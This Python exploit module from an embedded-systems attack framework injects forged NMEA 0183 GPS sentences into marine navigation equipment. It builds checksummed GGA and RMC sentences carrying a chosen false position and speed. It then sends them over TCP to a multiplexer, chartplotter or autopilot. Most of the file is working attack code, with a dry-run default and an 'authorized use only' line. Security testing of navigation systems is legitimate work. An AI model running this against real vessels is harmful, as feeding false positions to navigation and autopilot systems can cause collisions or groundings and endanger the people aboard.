"""NMEA 0183 Sentence Injection / Spoofing.

Injects crafted NMEA 0183 sentences (GGA, RMC, VTG, ZDA) into a NMEA
multiplexer or navigation system to feed false GPS position, time, or
speed data.  No authentication in NMEA 0183.

Original research / PoC credits
--------------------------------
Source  : WirelessXPL-Forge wirelessxpl/modules/maritime/nmea_spoof.py
          NMEA 0183 specification (https://www.nmea.org/content/nmea0183.html)

EmbedXPL port
-------------
Maintainer : Andre Henrique (@mrhenrike) | Uniao Geek

# authorized use only
"""
from __future__ import annotations

import socket

from embedxpl.core.exploit import *


def _checksum(sentence: str) -> str:
    crc = 0
    for ch in sentence:
        crc ^= ord(ch)
    return f"*{crc:02X}"


def _nmea_gga(lat: float, lon: float) -> str:
    lat_d = int(abs(lat))
    lat_m = (abs(lat) - lat_d) * 60
    lon_d = int(abs(lon))
    lon_m = (abs(lon) - lon_d) * 60
    lat_str = f"{lat_d:02d}{lat_m:07.4f}"
    lon_str = f"{lon_d:03d}{lon_m:07.4f}"
    ns = "N" if lat >= 0 else "S"
    ew = "E" if lon >= 0 else "W"
    body = f"GPGGA,120000.00,{lat_str},{ns},{lon_str},{ew},1,08,1.0,0.0,M,0.0,M,,"
    return f"${body}{_checksum(body)}"


def _nmea_rmc(lat: float, lon: float, sog: float = 0.0, cog: float = 0.0) -> str:
    lat_d = int(abs(lat))
    lat_m = (abs(lat) - lat_d) * 60
    lon_d = int(abs(lon))
    lon_m = (abs(lon) - lon_d) * 60
    ns = "N" if lat >= 0 else "S"
    ew = "E" if lon >= 0 else "W"
    body = (
        f"GPRMC,120000.00,A,"
        f"{lat_d:02d}{lat_m:07.4f},{ns},"
        f"{lon_d:03d}{lon_m:07.4f},{ew},"
        f"{sog:.2f},{cog:.2f},010101,,"
    )
    return f"${body}{_checksum(body)}"


class Exploit(Exploit):
    """NMEA 0183 Sentence Injection (GPS position spoofing)."""

    __info__ = {
        "name": "NMEA 0183 Sentence Injection (GPS spoof)",
        "description": (
            "Injects crafted NMEA GGA/RMC sentences into a NMEA multiplexer or "
            "navigation computer to feed false GPS coordinates. NMEA 0183 has no "
            "authentication. Useful for testing GPS spoofing detection in navigation systems."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://www.nmea.org/content/nmea0183.html",
            "https://gpsd.gitlab.io/gpsd/NMEA.html",
        ),
        "devices": ("NMEA multiplexers", "Chartplotters", "Autopilot systems"),
    }

    target = OptIP("", "NMEA multiplexer/server IP")
    port = OptPort(10110, "NMEA TCP port (standard: 10110)")
    lat = OptString("51.5072", "Spoofed latitude (decimal degrees)")
    lon = OptString("-0.1276", "Spoofed longitude (decimal degrees)")
    sog = OptString("0.0", "Speed over ground (knots)")
    count = OptInteger(10, "Number of sentences to send")
    dry_run = OptBool(True, "Dry run — show sentences only")

    @mute
    def check(self) -> bool:
        host = str(self.target)
        if not host:
            return False
        try:
            with socket.create_connection((host, int(self.port)), timeout=5):
                return True
        except Exception:
            return False

    def run(self) -> None:
        host = str(self.target)
        lat = float(str(self.lat))
        lon = float(str(self.lon))
        sog = float(str(self.sog))
        count = int(self.count)
        dry_run = bool(self.dry_run)

        sentences = [
            _nmea_gga(lat, lon),
            _nmea_rmc(lat, lon, sog=sog),
        ]

        print_status(f"NMEA sentence injection → {host}:{self.port}")
        for s in sentences:
            print_info(f"  {s}")

        if dry_run:
            print_info(f"DRY-RUN: {count} sentence cycle(s) would be sent")
            return

        if not host:
            print_error("No target IP specified")
            return

        try:
            with socket.create_connection((host, int(self.port)), timeout=10) as conn:
                for i in range(count):
                    for s in sentences:
                        conn.sendall((s + "\r\n").encode("ascii"))
                print_success(f"Sent {count * len(sentences)} NMEA sentences to {host}:{self.port}")
        except Exception as exc:
            print_error(f"Error: {exc}")
